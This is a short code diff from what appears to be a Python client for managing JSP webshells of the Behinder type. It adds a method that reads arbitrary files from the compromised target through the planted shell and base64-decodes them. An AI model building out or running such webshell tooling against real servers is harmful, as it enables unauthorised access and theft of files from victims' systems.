@@ -220,5 +220,17 @@ class JSPWebshellBehinderAES:
     async def mkdir(self, dir_path: str) -> None:
         await self.submit_code(f"mkdir({json.dumps(dir_path)})")
 
+    async def get_file_contents(
+        self, filepath: str, max_size: int = 1024 * 200
+    ) -> bytes:
+        """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
+        content_b64 = await self.submit_code(
+            f"readFile({json.dumps(filepath)}, {max_size})"
+        )
+        try:
+            return base64.b64decode(content_b64)
+        except Exception as exc:
+            raise exceptions.TargetRuntimeError("base64解码失败") from exc
+
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
